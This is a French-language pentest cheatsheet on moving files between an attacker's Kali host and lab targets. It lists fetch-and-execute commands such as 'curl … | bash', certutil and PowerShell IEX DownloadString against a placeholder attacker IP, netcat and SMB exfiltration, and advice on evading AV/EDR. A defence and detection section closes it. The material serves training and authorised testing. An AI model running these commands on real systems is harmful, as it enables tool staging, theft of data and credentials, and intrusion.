# Cheatsheet — Transfert de fichiers

Amener un outil sur la cible (upload) ou rapatrier un butin de preuve (download). Besoin transverse à **toutes** les machines : ton outillage est sur toi, il faut le faire passer.

> ⚠️ **Cadre.** Labs et périmètres autorisés uniquement (art. 323-1). En mission : ne déposer que le strict nécessaire, tout tracer, et **retirer** en fin de test les binaires posés.

---

## 1. Le principe

Deux rôles à distinguer :
- **Serveur** : la machine qui **héberge** le fichier (souvent toi, Kali).
- **Client** : la machine qui **va chercher** le fichier (souvent la cible).

Le sens du transfert détermine qui héberge :

| Sens | Qui héberge | Qui récupère |
| --- | --- | --- |
| **Kali → cible** (déposer un outil) | Kali (serveur) | la cible (client) |
| **Cible → Kali** (exfiltrer une preuve) | Kali reçoit, ou la cible héberge | l'autre bout |

> Réflexe : c'est **presque toujours la cible qui vient tirer (pull)** le fichier chez toi.
> D'où le besoin d'un service exposé de ton côté (HTTP, SMB…).

---

## 2. Côté Kali — monter un serveur

```bash
# HTTP (le plus universel) — sert le DOSSIER COURANT
python3 -m http.server 80
# → http://<TON_IP>/<fichier>

# SMB (pratique vers Windows, et pour REMONTER un fichier)
impacket-smbserver share . -smb2support
# avec identifiants (Windows récents exigent l'auth) :
impacket-smbserver share . -smb2support -user kali -password kali

# FTP (quand la cible a un client ftp)
python3 -m pyftpdlib -p 21 -w      # -w = écriture autorisée (pour l'upload)
```

Binaires Windows prêts à servir sur Kali : `/usr/share/windows-resources/` (nc.exe, etc.).

---

## 3. Kali → cible **Linux**

La cible télécharge depuis ton serveur HTTP :

```bash
# wget / curl (dans un dossier où tu peux écrire : /tmp)
cd /tmp
wget http://<TON_IP>/linpeas.sh
curl http://<TON_IP>/linpeas.sh -o linpeas.sh

# sans écrire sur le disque (exécution en mémoire) — idéal pour un script
curl http://<TON_IP>/linpeas.sh | bash
wget -qO- http://<TON_IP>/linpeas.sh | bash
```

> Le pipe `| bash` évite de poser le fichier (plus discret, pas de trace disque).
> Possible pour un **script** ; un binaire compilé doit, lui, être écrit puis rendu exécutable (`chmod +x`).

---

## 4. Kali → cible **Windows**

Depuis ton shell sur la cible, dans un dossier accessible en écriture
(`C:\Windows\Temp`, `C:\Users\Public`) :

```cmd
:: certutil (présent partout, cmd classique)
certutil -urlcache -split -f http://<TON_IP>/winPEASx64.exe wp.exe

:: PowerShell — écrit sur le disque
powershell -c "IWR http://<TON_IP>/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<TON_IP>/wp.exe','C:\Windows\Temp\wp.exe')"

:: depuis un partage SMB monté (impacket-smbserver côté Kali)
copy \\<TON_IP>\share\wp.exe C:\Windows\Temp\wp.exe
\\<TON_IP>\share\wp.exe          :: parfois exécutable directement depuis le partage
```

Exécution en mémoire (fileless) — **uniquement pour un script PowerShell**, pas un `.exe` :
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<TON_IP>/PowerUp.ps1')
```

> `.exe` compilé = à écrire sur disque avant lancement. `.ps1` = exécutable en mémoire via `IEX`.

---

## 5. Cible → Kali (exfiltrer une preuve)

```bash
# 1) SMB : le plus simple pour REMONTER un fichier
#    Kali :
impacket-smbserver share . -smb2support
#    Cible Windows :
copy C:\loot\out.txt \\<TON_IP>\share\
#    Cible Linux :
smbclient //<TON_IP>/share -c 'put out.txt'

# 2) netcat (Linux ↔ Linux)
#    Kali (reçoit) :
nc -lvnp 4444 > recu.txt
#    Cible (envoie) :
nc <TON_IP> 4444 < fichier.txt

# 3) la cible héberge, Kali tire
#    Cible : python3 -m http.server 8000
#    Kali  : wget http://<IP_CIBLE>:8000/fichier
```

---

## 6. SSH / SCP (quand tu as des identifiants SSH)

```bash
scp fichier.txt user@<IP_CIBLE>:/tmp/       # Kali → cible
scp user@<IP_CIBLE>:/home/user/id_rsa .     # cible → Kali
```

---

## 7. Tableau de synthèse

| Situation | Commande clé |
| --- | --- |
| Kali sert un fichier | `python3 -m http.server 80` |
| Kali sert en SMB | `impacket-smbserver share . -smb2support` |
| Cible Linux tire | `wget http://IP/x` · `curl http://IP/x\|bash` |
| Cible Windows tire | `certutil -urlcache -split -f http://IP/x out.exe` |
| Windows fileless (.ps1) | `IEX(New-Object Net.WebClient).DownloadString('http://IP/x.ps1')` |
| Remonter vers Kali | SMB `copy x \\IP\share\` · `nc -lvnp` |
| Avec creds SSH | `scp` |

---

## 8. Pièges fréquents

- **Dossier en lecture seule** : « Accès refusé » à l'écriture → `cd C:\Windows\Temp` (Windows) ou `/tmp` (Linux).
- **Port occupé / bloqué** : un pare-feu sortant côté cible peut bloquer ton port. Essaie 80/443 (sortie souvent autorisée).
- **Mauvaise IP** : sur HTB c'est **ton IP tun0** (`10.10.14.x`), pas l'IP cible.
- **SMBv1 vs v2** : ajoute `-smb2support` à impacket. Windows récents refusent l'accès anonyme → serveur SMB **avec `-user`/`-password`**.
- **Binaire non exécutable (Linux)** : après download, `chmod +x fichier`.
- **AV/EDR** : winPEAS, nc.exe, mimikatz sont détectés. En lab HTB souvent désactivé ; sinon versions obfusquées ou exécution en mémoire.

---

## 9. Côté défense / détection

| Technique | Trace |
| --- | --- |
| `certutil -urlcache` | Souvent signé « living-off-the-land » : 4688 avec ligne de commande `certutil` + URL |
| `powershell IWR/DownloadString` | ScriptBlock logging (4104), 4688, connexion sortante |
| Partage SMB entrant sur poste | connexions SMB anormales vers une IP externe |
| netcat sortant | process → connexion sortante inattendue (T1105 Ingress Tool Transfer) |

**Durcissement** : blocage des connexions sortantes non nécessaires (egress filtering), restriction/audit de `certutil`, `bitsadmin`, PowerShell en Constrained Language Mode + journalisation ScriptBlock, EDR sur les binaires d'outillage (mimikatz, nc), application allow-listing (AppLocker/WDAC).

---

## 10. À savoir expliquer à l'oral

- **Sens du transfert** : dans la majorité des cas, c'est la cible qui *tire* le fichier chez l'attaquant → il faut un service exposé côté attaquant.
- **`.exe` vs `.ps1`** : un binaire compilé doit être écrit sur disque ; un script PowerShell s'exécute en mémoire (`IEX`) → plus furtif, moins de trace disque.
- **Living-off-the-land** : `certutil`, `bitsadmin`, `powershell` sont des binaires **légitimes** détournés pour télécharger → d'où l'intérêt de les auditer côté défense (technique T1105 MITRE ATT&CK).
- **Pourquoi le filtrage sortant compte** : couper l'egress casse à la fois le téléchargement d'outils et l'exfiltration.
